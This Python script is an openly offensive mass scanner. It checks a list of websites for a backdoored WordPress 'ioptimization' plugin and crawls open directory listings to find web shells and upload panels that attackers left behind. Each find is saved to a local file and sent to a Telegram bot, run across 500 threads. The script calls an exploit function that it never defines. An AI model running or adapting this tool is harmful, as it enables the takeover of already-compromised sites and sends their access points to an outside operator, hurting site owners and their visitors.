#from distutils.command.upload import upload
from tabnanny import check
import requests
import os
import sys
from re import findall as reg
from multiprocessing.dummy import Pool
import string
from random import choice, randint
from colorama import Fore
from colorama import Style
from colorama import init
init(autoreset=True)
fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT

requests.urllib3.disable_warnings()

headers = {'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}

def SendMsg(token,chatid,msg):
    requests.get('https://api.telegram.org/bot{}/sendMessage?chat_id={}&text={}'.format(token,chatid,msg))
    return
def again(i) :
    try :
        vulns = 'http://'+i+'/wp-content/plugins/ioptimization/IOptimize.php?rchk'
        swqlsjd____ = requests.get(vulns, verify=False, timeout=10)
        if 'ioptimization' in  swqlsjd____.text :
            print(fg+'Is vuln =====>>>>> '+vulns)
            uploader_exploit_utchiha(vulns)
        else :
            print(fr+'[Not_vuln] ========>>>>  '+i)
    except :
        pass
url ='https://raw.githubusercontent.com/bokxud/Private/main/indexofpaths.txt'
fews = requests.get(url).text
ofindex = reg('(.*?)\n',fews)
def checke(i) :
    global ofindex
    try :
        for k in  ofindex :
            url  = 'http://'+i+'/'+k
            checking = requests.get(url, timeout=10).text
            if '<title>Index of' in checking :
                got(url)
            else :
                print('Faild =====>>> '+i)
    except :
        pass
def got(url) :
    try :
        check =requests.get(url, timeout=10).text
        checking = reg('href="(.*?)">', check)[5:]
        for x in checking :
            if '/' not in  x and '.php' in x :
                new_url = url+x
                checking_new = requests.get(new_url, timeout=10)
                if ">public_html" in checking_new.text or "<span>Upload file:" in checking_new.text or 'type="submit" id="_upl" value="Upload">' in checking_new.text or 'button type="submit" name="upload" class="btn btn-secondary btn-block bg-transparent mt-3" id="load"' in checking_new.text or '>File Upload :<' in checking_new.text or 'Leaf PHPMailer</title>' in checking_new.text :
                    print('Found shell here :   '+new_url)
                    open('rsf_utchiha.txt','a').write(new_url+'\n')
                    SendMsg(token,chatid,new_url)
                elif 'method=post>Password<br><input type=password' in checking_new.text :
                    print('SHELLPASWORD ====>>> '+new_url)
                    open('passw.txt','a').write(new_url+'\n')
                    SendMsg(token,chatid,new_url)
                else :
                    print(new_url)
            elif '/' in x :
                link = url+x
                second = requests.get(link, timeout=10)
                if '<title>Index of' in second.text :
                    utch = reg('href="(.*?)">', second.text)
                    for z in utch :
                        if '/' not in z and '.php' in z:
                            folder_two = link + z
                            folder_check = requests.get(folder_two,timeout=10)
                            if ">public_html" in folder_check.text or "<span>Upload file:" in folder_check.text or 'type="submit" id="_upl" value="Upload">' in folder_check.text or 'button type="submit" name="upload" class="btn btn-secondary btn-block bg-transparent mt-3" id="load"' in folder_check.text or '>File Upload :<' in folder_check.text or 'Leaf PHPMailer</title>' in folder_check.text :
                                print('found shell here =====>> '+folder_two)
                                open('rsf_utchiha.txt','a').write(folder_two+'\n')
                                SendMsg(token,chatid,folder_two)
                            elif 'method=post>Password<br><input type=password' in folder_check.text :
                                print('Password '+folder_two)
                                open('shell_pssw.txt','a').write(folder_two+'\n')
                                SendMsg(token,chatid,folder_two)
                            else:
                                print(folder_two)
                        elif '/' in z :
                            make = link+z
                            las = requests.get(make, timeout=10).text
                            if '<title>Index of' in las :
                                jbad = reg('href="(.*?)">', las)
                                for a in jbad :
                                    if '/' not in a and '.php' in a :
                                        lien = make + a
                                        send = requests.get(lien, timeout=10).text
                                        if ">public_html" in send or "<span>Upload file:" in send or 'type="submit" id="_upl" value="Upload">' in send or 'button type="submit" name="upload" class="btn btn-secondary btn-block bg-transparent mt-3" id="load"' in send or '>File Upload :<' in send or 'Leaf PHPMailer</title>' in send :
                                            print('shell is here ====>> '+lien)
                                            open('rsf_utchiha.txt','a').write(lien+'\n')
                                            SendMsg(token,chatid,lien)
                                        elif 'method=post>Password<br><input type=password' in send :
                                            print('password ======>> '+lien)
                                            open('shell_pssw.txt','a').write(lien+'\n')
                                            SendMsg(token,chatid,lien)
                                        else:
                                            print(lien)
                                    elif '/' in a :
                                        utchiha_hacker = make + a
                                        sender_ut = requests.get(utchiha_hacker, timeout=10).text
                                        if '<title>Index of' in sender_ut :
                                            listat = reg('href="(.*?)">', sender_ut)
                                            for w in listat :
                                                if '/' not in w and '.php' in w :
                                                    rabitt = utchiha_hacker + w
                                                    checkingg = requests.get(rabitt, timeout=10).text
                                                    if ">public_html" in checkingg or "<span>Upload file:" in checkingg or 'type="submit" id="_upl" value="Upload">' in checkingg or 'button type="submit" name="upload" class="btn btn-secondary btn-block bg-transparent mt-3" id="load"' in checkingg or '>File Upload :<' in checkingg or 'Leaf PHPMailer</title>' in checkingg :
                                                        print('Shell here ====> '+rabitt)
                                                        open('rsf_utchiha.txt','a').write(rabitt+'\n')
                                                        SendMsg(token,chatid,rabitt)
                                                    elif 'method=post>Password<br><input type=password' in checkingg :
                                                        print('Password here =====>  '+rabitt)
                                                        open('shell_passw.txt','a').write(rabitt+'\n')
                                                        SendMsg(token,chatid,rabitt)
                                                    else:
                                                        print(rabitt)
                                                elif '/' in w :
                                                    serv = utchiha_hacker + w #hada rah folder for9 folder
                                                    f_serv = requests.get(serv, timeout=10).text
                                                    if '<title>Index of' in f_serv :
                                                        noce = reg('href="(.*?)">', f_serv)
                                                        for q in noce :
                                                            if '/' not in q and '.php' in q :
                                                                mw = serv + q
                                                                check_q =requests.get(mw, timeout=10).text
                                                                if ">public_html" in check_q or "<span>Upload file:" in check_q or 'type="submit" id="_upl" value="Upload">' in check_q or 'button type="submit" name="upload" class="btn btn-secondary btn-block bg-transparent mt-3" id="load"' in check_q or '>File Upload :<' in check_q or 'Leaf PHPMailer</title>' in check_q :
                                                                    print('shell =====>  '+mw)
                                                                    open('rsf_utchiha.txt','a').write(mw+'\n')
                                                                    SendMsg(token,chatid,mw)
                                                                elif 'method=post>Password<br><input type=password' in check_q :
                                                                    print('Password =======>'+mw)
                                                                    open('shell_passw.txt','a').write(mw+'\n')
                                                                    SendMsg(token,chatid,mw)
                                                                else :
                                                                    print(mw)
            else:
                print('None')
    except:
        pass

def all(i) :
    again(i)
    checke(i)

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')
def main() :
    global token , chatid
    if os.path.isfile('config.ini'):
        configs = open('config.ini','r',errors='ignore').read()
        token = reg('token = "(.*?)"',configs)[0]
        chatid = reg('chatid = "(.*?)"',configs)[0]
    else:
        open('config.ini','a').write('token = ""\nchatid = ""')
        input('[!] Press Enter to exit!')
        exit() 
    utchiha = Pool(int(500))
    utchiha.map(all, target)
main()       
    #Pool(int(100)).map(all, target)
#main()